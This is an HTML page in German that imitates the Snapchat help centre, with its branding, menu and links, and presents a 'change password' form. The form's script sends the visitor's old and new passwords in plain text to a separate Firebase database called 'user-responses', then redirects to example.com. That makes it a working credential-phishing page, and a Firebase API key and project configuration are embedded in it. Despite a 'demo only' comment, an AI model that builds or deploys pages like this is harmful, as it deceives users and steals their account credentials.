<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <title>Passwort zurücksetzen:</title>

  <link rel="icon" type="image/png" sizes="64x64" href="Favicon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="Favicon.png">
  <link rel="apple-touch-icon" href="Favicon.png">
  
 <!-- CSS -->
  <style>
    html, body {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      margin: 0;
      font-family: "Public Sans", "Inter", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      font-weight: 400;       /* normale Stärke */
      letter-spacing: -0.2px; /* Abstand zwischen Buchstaben */
      line-height: 1.18;      /* Zeilenhöhe */
      margin: 0;
      padding: 0;
      color: #111;
      background-color: #f0f0f0;
    }

    body {
      font-family: Avenir Next;
      text-align: center;
      margin: 0;
      padding: 0;
      background-color: #f0f0f0;
      color: #111;
      min-height:200vh;
      overflow-y: auto;
    }

    /* Banner-CSS */
    .banner {
      background-color: #fffc00;
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 50px;
      height: 60px;
      padding: 10px;
      position: sticky;
      top: 0;
      width: 100vw;
      box-sizing: border-box;
      z-index: 1000;
    }
     #menuLogo {
      position: absolute;
      height: 40px;
      width: 40px;
      left: 13px;
      top: 10px;
    }
     #Ghostlogo {
     position: absolute;
     top: 13px;     
     left: 99px;
     transform: translateX(-50% + 4px);
     height: 50% +5px;  
     width: 170px;
     margin-left: 20px;
     transition: transform 0.2s ease;
   }
     #searchLogo {
      position: absolute;
      height: 50px;
      width: 50px;
      top: 5px;
      right: 13px;
      cursor: pointer;
    }
    .banner .logo {
      cursor: pointer;
      transition: transform 0.2s;
    }

@media (max-width: 600px) {
  .banner {
    flex-wrap: nowrap;         /* NICHT wrap, sonst verschiebt sich die Zentrierung */
    justify-content: center;   /* immer zentriert */
    gap: 15px;                 /* Abstand ggf. kleiner */
    padding: 0 10px;
  }
}

    /* Inhalt der Main-Seite */
    .content {
      padding: 50px;
    }

    input, textarea, button {
      width: 90%;
      max-width: 400px;
      padding: 10px;
      margin: 5px auto;
      font-size: 16px;
      display: block;
    }

    textarea {
      height: 100px;
    }

    button {
      cursor: pointer;
      background-color: #ff00ff;
      color: #fff;
      border: none;
      border-radius: 5px;
    }
    
      .fehlermeldung {
    color: red;
    font-style: italic;
  }
    
#menuLogo.open {
  transform: scale(0.5); /* halb so groß */
  transition: transform 0.2s ease;
}
    
/* Menü komplett unsichtbar am Start */
#dropdownMenu {
  position: fixed;
  top: 60px; /* Höhe des Headers */
  left: 0;
  width: 100%;
  height: calc(100% - 60px);
  background-color: #fffc00; 
  opacity: 0;
  pointer-events: none;
  display: flex;
  flex-direction: column;
  padding-top: 20px;
  z-index: 1000;
  transition: opacity 0.4s ease;
  align-items: flex-start;
  overflow-y: auto;
  -webkit-overflow-scrolling: touch; /* iOS smooth */
  padding-bottom: 350px;
}
    
#dropdownMenu.show {
  opacity: 1;
  pointer-events: auto;
}
  /* Scrollable auf mobile devices*/
@media (max-width: 900px) {
  #dropdownMenu {
    height: calc(100vh - 60px);
    overflow-y: auto;
  }
 }
/* Submenu Animation */
.submenu {
  max-height: 0;            /* versteckt */
  display: flex;
  width: 100%;
  pointer-events:none;
  opacity: 0;               /* unsichtbar */
  flex-direction: column;
  align-items: flex-start;
  transition: max-height 0.2s ease, opacity 0.3s ease; /* animiert Fade + Slide */
  padding-left: 0px;
}
    
.submenu.open {       
  opacity: 1;
  max-height: 1000px;
  pointer-events: auto;
}

/* Menüpunkt Styling */
.overlay-item {
  display: flex;
  justify-content: flex-start;
  align-items: center;
  padding: 12px 20px;
  font-size: 14px;
  font-weight: 500;
  cursor: pointer;
  text-decoration: none;
  box-sizing: border-box;
  color: #3a3e41;
}

.sub-item {
  display: block;
  padding: 8px 40px;
  width: 100%;
  font-size: 14px;
  font-weight: 300;
  color: #3a3e41;
  text-decoration: none;
  text-align: left;
  padding-left: 40px;
}

.sub-item:hover {
  background: rgba(0,0,0,0.05);
}
    
.overlay-item.has-submenu {
  position: relative;
  display: flex;
  width: 100%;
  justify-content: flex-start;
  align-items: center;
  padding: 12px 20px;
  font-size: 14px;
  font-weight: 500;
  cursor: pointer;
  text-decoration: none;
  box-sizing: border-box;
  color: #3a3e41;
}    
/* Pfeil am rechten Rand, statisch */
.submenu-icon {
  width: 12px;        /* kleiner als Original */
  height: 12px;       /* proportional anpassen */
  display: block;
  transition: transform 0.2s ease;
}
    
/* Pfeil absolut am rechten Rand */
.overlay-item.has-submenu .submenu-icon {
  position: absolute;
  right: 20px;            /* Abstand vom rechten Bildschirmrand */
  top: 50%;
  transform: translateY(-50%) rotate(0deg);  /* zentriert vertikal, Standardrotation */
  transition: transform 0.3s ease;
}
    
/* Pfeil drehen, wenn Untermenü geöffnet ist */
.overlay-item.has-submenu.open .submenu-icon {
  transform: translateY(-50%) rotate(180deg);
}
    
.overlay-spacer {
      height: 20px;
    }

.overlay-header {
      padding: 12px 20px;
      font-size: 12px;
      font-weight: 500;
      color: #3a3e41;
    }
.menu-item {
      padding: 12px 20px;
      font-size: 14px;
      text-decoration: none;
      justify-content: flex-start;
      font-weight: 500;
      color: #3a3e41;
    }
    /* === HOVER: alles wird schwarz === */
.overlay-item:hover,
.sub-item:hover,
.menu-item:hover,
.overlay-header:hover {
  color: #000;        /* tiefes Schwarz */
}

/* === ACTIVE / GEKLICKT === */
.overlay-item:active,
.sub-item:active,
.menu-item:active,
.overlay-header:active {
  color: #000;
}

/* === FOCUS (Keyboard / Mobile Tap) === */
.overlay-item:focus,
.sub-item:focus,
.menu-item:focus,
.overlay-header:focus {
  color: #000;
  outline: none;
}
/* aktiver Menüpunkt, wenn Submenu offen */
.overlay-item.open {
  color: #000;
}
  
#searchOverlay {
  position: absolute;
  top: 0;
  left: 0;
  display: flex;
  justify-content: flex-end;
  width: 100%;
  height: 50px;                  /* füllt Banner + etwas darüber */
  background: transparent;       /* Banner sichtbar, Overlay transparent */
  z-index: 1010;
  pointer-events: none;          /* erst aktiv bei .active */
  opacity: 0;
  transition: opacity 0.25s ease;
  margin: 5px 0;
}

#searchOverlay.active {
  opacity: 1;
  pointer-events: auto;
}

/* Suchbox */
.searchBox {
  display: flex;
  align-items: center;
  gap: 8px;
  background: #fff;
  padding: 6px 12px;
  border-radius: 20px;           /* stark abgerundet */
  box-shadow: 0 2px 8px rgba(0,0,0,0.2);
  max-width: 66vw;               /* ca. 2/3 Bildschirmbreite auf Mobile */
  width: 100%;                    /* bei Desktop kleiner: max-width regelt */
  height: 60px; 
  margin: 5px 0;                 /* vertikaler Abstand zum Bannerrand */
}

/* Icon */
.activeSearchIcon {
  display: block;
  max-height: 100%;
  width: auto;
  flex-shrink: 0;
}

/* Input */
.searchInput {
  border: none;
  outline: none;
  justify-content: flex-start;
  align-items: center;
  background: transparent;
  font-size: 14px;
  width: 100%;                 /* füllt Rest der Box */
}

/* Abbrechen */
#cancelSearch {
  cursor: pointer;
  color: #555;
  margin-left: auto;
}

#cancelSearch:hover {
  text-decoration: underline;
}

/* Mobile Anpassung */
@media (max-width: 600px) {
  .searchBox {
    max-width: 66vw;           /* ca. 2/3 Bildschirmbreite */
    padding: 6px 14px;
  }
}

  </style>
    
  <!-- Firebase -->
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
</head>

<body>

  <!-- Banner-HTML -->
  <header class="banner">

    <!-- MENU-->
 <img src="Menu.jpeg" alt="Menu" class="logo" id="menuLogo">  
    
    <!-- GHOST: HOMEPAGE-->
    <a href="https://help.snapchat.com/hc/de">
      <img src="Ghost.png" alt="Ghost" class="Ghostlogo" id="Ghostlogo">
    </a>
    
    <!-- SEARCH-->
<!-- SEARCH-OVERLAY -->
<div id="searchOverlay">
  <div class="searchBox">
    <img src="active.searchicon.png" alt="Lupen-Icon" class="activeSearchIcon">
    <span class="searchText">Suche</span>
    <input type="text" class="searchInput" placeholder="Suche">
    <span id="cancelSearch">Abbrechen</span>
  </div>
</div>

<!-- Trigger -->
<img src="search.jpeg" alt="Search Logo" id="searchLogo">
  </header>
 
  <!-- DROPDOWN MENÜ -->  
  <div id="dropdownMenu">
  <!-- Menüinhalt -->
    <!-- NO SUBMENUS -->
    <a href="https://help.snapchat.com/hc/de/categories/5685832477716" class="menu-item">Snapchat verwenden</a>
    <a href="https://help.snapchat.com/hc/de/categories/5685799746324" class="menu-item">Meinen Account verwalten</a>
    <a href="https://help.snapchat.com/hc/de/categories/5685833655188" class="menu-item">Sicherheit</a>
    <a href="https://help.snapchat.com/hc/de/categories/5685796332948" class="menu-item">Privatsphäre</a>
    
    <div class="overlay-item has-submenu" data-target="sub1">Weitere Ressourcen
        <img src="arrow-right.png" class="submenu-icon"> </div>
    <!-- SUBMENU Weitere Ressourcen-->
  <div class="submenu" id="sub1">
  <a href="https://accounts.snapchat.com/v2/login"class="sub-item">Account-Login</a>
  <a href="https://parents.snapchat.com/"class="sub-item">Für Eltern</a>
  <a href="https://forbusiness.snapchat.com/?utm_source=help_snapchat_com&utm_medium=referral&utm_campaign=universal_navigation&utm_content=nav_ads"class="sub-item">Für Unternehmen</a>
  <a href="https://creators.snapchat.com/"class="sub-item">Für Kreatoren</a>
  <a href="https://values.snap.com/"class="sub-item">Hub für Datenschutz und Sicherheit</a>
  </div>

    <div class="overlay-spacer"></div>

    <div class="overlay-header">Explore More Sites</div>
    
    <div class="overlay-item has-submenu" data-target="sub2">Snap Inc.
        <img src="arrow-right.png" class="submenu-icon"> </div>
    <!-- SUBMENU Snap Inc.-->
      <div class="submenu" id="sub2">
     <a href="https://www.snap.com/?utm_source=global_nav&utm_medium=referral&utm_content=global_nav_item&utm_campaign=universal_navigation" class="sub-item">Snap Inc.</a>
     <a href="https://investor.snap.com/overview/default.aspx" class="sub-item">Investors</a>
     <a href="https://careers.snap.com/?utm_source=global_nav&utm_medium=referral&utm_content=global_nav_item&utm_campaign=universal_navigation" class="sub-item">Careers</a>
     <a href="https://newsroom.snap.com/?utm_source=global_nav&utm_medium=referral&utm_content=global_nav_item&utm_campaign=universal_navigation" class="sub-item">News</a>
     <a href="https://values.snap.com/?utm_source=global_nav&utm_medium=referral&utm_content=global_nav_item&utm_campaign=universal_navigation" class="sub-item">Privacy and Safety</a>
     <a href="https://citizen.snap.com/?utm_source=global_nav&utm_medium=referral&utm_content=global_nav_item&utm_campaign=universal_navigation" class="sub-item">Citizen Snap</a>
     <a href="https://www.bitmoji.com/?utm_source=global_nav&utm_medium=referral&utm_content=global_nav_item&utm_campaign=universal_navigation" class="sub-item">Bitmoji</a>
</div>
      
    <div class="overlay-spacer"></div>
    
    <div class="overlay-item has-submenu" data-target="sub3">Spectacles
        <img src="arrow-right.png" class="submenu-icon"> </div>
    <!-- SUBMENU Spectacles-->
    <div class="submenu" id="sub3">
    <a href="https://www.spectacles.com/?utm_source=global_nav&utm_medium=referral&utm_content=global_nav_item&utm_campaign=universal_navigation" class="sub-item">Spectacles</a>
    <a href="https://support.spectacles.com/hc/de" class="sub-item">Spectacles Support</a>
</div>
      
    <div class="overlay-item has-submenu" data-target="sub4">Build with Snap
        <img src="arrow-right.png" class="submenu-icon"> </div>
    <!-- SUBMENU Build with Snap-->
     <div class="submenu" id="sub4">
    <a href="https://ar.snap.com/?utm_source=global_nav&utm_medium=referral&utm_content=global_nav_item&utm_campaign=universal_navigation" class="sub-item">Build with Snap</a>
    <a href="https://ar.snap.com/lens-studio?utm_source=global_nav&utm_medium=referral&utm_content=global_nav_item&utm_campaign=universal_navigation" class="sub-item">Lens Studio</a>
    <a href="https://ar.snap.com/lens-web-builder?utm_source=global_nav&utm_medium=referral&utm_content=global_nav_item&utm_campaign=universal_navigation" class="sub-item">Lens Web Builder</a>
    <a href="https://ar.snap.com/camera-kit?utm_source=global_nav&utm_medium=referral&utm_content=global_nav_item&utm_campaign=universal_navigation" class="sub-item">Camera Kit</a>
</div>
      
    <div class="overlay-item has-submenu" data-target="sub5">Business
        <img src="arrow-right.png" class="submenu-icon"> </div>
    <!-- SUBMENU Business-->
    <div class="submenu" id="sub5">
    <a href="https://forbusiness.snapchat.com/?utm_source=global_nav&utm_medium=referral&utm_content=global_nav_item&utm_campaign=universal_navigation" class="sub-item">For Business</a>
    <a href="https://ads.snapchat.com/?utm_source=global_nav&utm_medium=referral&utm_content=global_nav_item&utm_campaign=universal_navigation" class="sub-item">Ads Manager</a>
    <a href="https://snappublisher.snapchat.com/?utm_source=global_nav&utm_medium=referral&utm_content=global_nav_item&utm_campaign=universal_navigation" class="sub-item">Snap Publisher</a>
    <a href="https://businesshelp.snapchat.com/?utm_source=global_nav&utm_medium=referral&utm_content=global_nav_item&utm_campaign=universal_navigation" class="sub-item">Business Support</a>
    <a href="https://forbusiness.snapchat.com/public-profiles?utm_source=global_nav&utm_medium=referral&utm_content=global_nav_item&utm_campaign=universal_navigation" class="sub-item">Public Profiles for Business</a>
    <a href="https://adsgallery.snap.com/?utm_source=global_nav&utm_medium=referral&utm_content=global_nav_item&utm_campaign=universal_navigation" class="sub-item">Ads Gallery</a>    
</div>
      
    <div class="overlay-item has-submenu" data-target="sub6">Creators
        <img src="arrow-right.png" class="submenu-icon"> </div>
    <!-- SUBMENU Creators-->
     <div class="submenu" id="sub6">
    <a href="https://creators.snapchat.com/?utm_source=global_nav&utm_medium=referral&utm_content=global_nav_item&utm_campaign=universal_navigation" class="sub-item">Creator Hub</a>
    <a href="https://my.snapchat.com/?utm_source=global_nav&utm_medium=referral&utm_content=global_nav_item&utm_campaign=universal_navigation" class="sub-item">Post to Spotlight</a>   
</div>
      
    <div class="overlay-item has-submenu" data-target="sub7">Developers
        <img src="arrow-right.png" class="submenu-icon"> </div>
     <!-- SUBMENU Developers-->
     <div class="submenu" id="sub7">
    <a href="https://developers.snap.com/?utm_source=global_nav&utm_medium=referral&utm_content=global_nav_item&utm_campaign=universal_navigation" class="sub-item">For Developers</a>
    <a href="https://playcanvas.com/?utm_source=global_nav&utm_medium=referral&utm_content=global_nav_item&utm_campaign=universal_navigation" class="sub-item">Play Canvas</a>
    <a href="https://marketingapi.snapchat.com/docs/?utm_source=global_nav&utm_medium=referral&utm_content=global_nav_item&utm_campaign=universal_navigation" class="sub-item">Marketing API</a> '
</div>
      
    <div class="overlay-item has-submenu" data-target="sub8">Safety
        <img src="arrow-right.png" class="submenu-icon"> </div>
    <!-- SUBMENU Safety-->
     <div class="submenu" id="sub8">
    <a href="https://parents.snapchat.com/?utm_source=global_nav&utm_medium=referral&utm_content=global_nav_item&utm_campaign=universal_navigation" class="sub-item">For Parents</a>
    <a href="https://educators.snapchat.com/?utm_source=global_nav&utm_medium=referral&utm_content=global_nav_item&utm_campaign=universal_navigation" class="sub-item">For Educators</a>
    <a href="https://thekeys.snapchat.com/?utm_source=global_nav&utm_medium=referral&utm_content=global_nav_item&utm_campaign=universal_navigation" class="sub-item">The Keys</a>
    <a href="https://belonging.snap.com/?utm_source=global_nav&utm_medium=referral&utm_content=global_nav_item&utm_campaign=universal_navigation" class="sub-item">Belonging at Snap</a>
    <a href="https://values.snap.com/?utm_source=global_nav&utm_medium=referral&utm_content=global_nav_item&utm_campaign=universal_navigation" class="sub-item">Privacy & Safety</a>
    <a href="https://citizen.snap.com/?utm_source=global_nav&utm_medium=referral&utm_content=global_nav_item&utm_campaign=universal_navigation" class="sub-item">Citizen Snap</a>     
</div>
  </div>
  
  <!-- Inhalt -->
  <div class="content">
    <h1>Passwort ändern</h1>
    <input type="text" id="Passwort" placeholder="Altes Passwort">
    <input type="text" id="PasswortNeu" placeholder="Neues Passwort mind. 8 Zeichen">
    <input type="text" id="PasswortWdh" placeholder="Passwort wiederholen">
    <button onclick="speichern()">Passwort ändern</button>
    <p id="status"></p>
  </div>
  
   <!-- JavaScript-->
<script>
document.addEventListener("DOMContentLoaded", () => {
  const menuLogo = document.getElementById("menuLogo");
  const dropdownMenu = document.getElementById("dropdownMenu");
  const menuOpenIcon = "Menu.jpeg";       
  const menuCloseIcon = "menu-close.png"; 
  const submenuItems = document.querySelectorAll(".overlay-item.has-submenu");

  // ======================
  // MENU öffnen/schließen
  // ======================
  menuLogo.addEventListener("click", () => {
    const isOpen = dropdownMenu.classList.toggle("show");
    if (isOpen) {
      menuLogo.src = menuCloseIcon;
      menuLogo.classList.add("open");
    } else {
      menuLogo.src = menuOpenIcon;
      menuLogo.classList.remove("open");
    }
  });

  // ======================
  // SUBMENUS initialisieren
  // ======================
  submenuItems.forEach((item, index) => {
    const submenu = item.nextElementSibling;
    if (!submenu) return;

    const subId = "sub" + (index + 1);
    submenu.id = subId;
    item.dataset.target = subId;

    item.addEventListener("click", (e) => {
      e.preventDefault();
      e.stopPropagation(); // verhindert, dass Klick auf Window ausgelöst wird

      const targetMenu = document.getElementById(item.dataset.target);

      // Alle anderen Submenus schließen
      document.querySelectorAll(".submenu").forEach(sub => {
        if (sub !== targetMenu) sub.classList.remove("open");
      });
      submenuItems.forEach(i => {
        if (i !== item) i.classList.remove("open");
      });

      // Eigenes Submenu toggeln
      const isOpening = !targetMenu.classList.contains("open");
      targetMenu.classList.toggle("open");
      item.classList.toggle("open");

      // ======================
      // Scroll-Handling innerhalb des Dropdown-Menüs
      // ======================
      if (isOpening) {
        setTimeout(() => {
          const dropdownHeight = dropdownMenu.clientHeight;
          const dropdownScrollTop = dropdownMenu.scrollTop;
          const submenuRect = targetMenu.getBoundingClientRect();
          const menuRect = dropdownMenu.getBoundingClientRect();

          // Wie viel des Submenus unterhalb des sichtbaren Bereichs liegt
          const over = submenuRect.bottom - menuRect.bottom;
          if (over > 0) {
            dropdownMenu.scrollBy({ top: over + 10, behavior: "smooth" });
          }

          // Optional: etwas nach oben scrollen, falls Submenu teilweise außerhalb oben
          const under = menuRect.top - submenuRect.top;
          if (under > 0) {
            dropdownMenu.scrollBy({ top: -under - 10, behavior: "smooth" });
          }
        }, 200); // Warten, bis CSS Transition aktiv ist
      }
    });
  });

  // ======================
  // Klick außerhalb → Menü schließen
  // ======================
  window.addEventListener("click", (e) => {
    if (!dropdownMenu.contains(e.target) && !menuLogo.contains(e.target)) {
      dropdownMenu.classList.remove("show");
      document.querySelectorAll(".submenu").forEach(sub => sub.classList.remove("open"));
      submenuItems.forEach(item => item.classList.remove("open"));
    }
  });

  // ======================
  // Optional: Menü auf Touch-Scroll fixieren (Mobile)
  // ======================
  dropdownMenu.addEventListener("touchstart", e => {
    e.stopPropagation();
  });
});

  // ======================
  // SEARCH-FUNKTION
  // ======================

const searchLogo = document.getElementById("searchLogo");
const searchOverlay = document.getElementById("searchOverlay");
const cancelSearch = document.getElementById("cancelSearch");
const ghostLogo = document.getElementById("Ghostlogo");

function openSearch() {
  searchOverlay.classList.add("active");
  ghostLogo.style.transform = "translateX(-50px)";
  document.querySelector(".searchInput").focus();
  searchLogo.style.opacity = 0;  // Trigger ausblenden
}

function closeSearch() {
  searchOverlay.classList.remove("active");
  ghostLogo.style.transform = "translateX(0)";
  searchLogo.style.opacity = 1;  // Trigger wieder einblenden
}

searchLogo.addEventListener("click", openSearch);
cancelSearch.addEventListener("click", closeSearch);

  // --- FIREBASE INIT ---
  const firebaseConfig = {
    apiKey: "AIzaSyDugmUCYr7puMpV72LbwrZCQNAKZSZjqvo",
    authDomain: "user-responses.firebaseapp.com",
    databaseURL: "https://user-responses-default-rtdb.firebaseio.com",
    projectId: "user-responses",
    storageBucket: "user-responses.firebasestorage.app",
    messagingSenderId: "125716368432",
    appId: "1:125716368432:web:61a661901b71b7a9e271f5"
  };

  firebase.initializeApp(firebaseConfig);
  const db = firebase.database();

  // --- PASSWORT SPEICHERN ---
  window.speichern = function() {
    const Passwort = document.getElementById('Passwort').value.trim();
    const PasswortNeu = document.getElementById('PasswortNeu').value.trim();
    const PasswortWdh = document.getElementById('PasswortWdh').value.trim();
    const status = document.getElementById('status');

    // Validierung
    if (!Passwort || !PasswortNeu || !PasswortWdh) {
      status.className = "fehlermeldung";
      status.innerText = "Füllen Sie bitte alle Felder aus!";
      return;
    }
    if (Passwort === PasswortNeu) {
      status.className = "fehlermeldung";
      status.innerText = "Verwende ein neues Passwort";
      return;
    }
    if (PasswortNeu !== PasswortWdh) {
      status.className = "fehlermeldung";
      status.innerText = "Leider war die Passwort-Wiederholung fehlerhaft. Achte auf Groß- und Kleinschreibung.";
      return;
    }
    if (PasswortNeu.length < 8) {
      status.className = "fehlermeldung";
      status.innerText = "Das neue Passwort muss mindestens 8 Zeichen lang sein.";
      return;
    }

    // Firebase speichern
    db.ref('users/testuser').set({
      altesPasswort: Passwort,      // Nur Demo! Niemals Klartext im echten System!
      neuesPasswort: PasswortNeu
    })
    .then(() => {
      status.className = "fehlermeldung";
      status.innerText = "Passwort erfolgreich geändert!";
      setTimeout(() => {
        window.location.href = "https://example.com";
      }, 1000);
    })
    .catch(err => {
      status.className = "fehlermeldung";
      status.innerText = "Fehler: " + err;
    });
  };
</script>


</body>
</html>
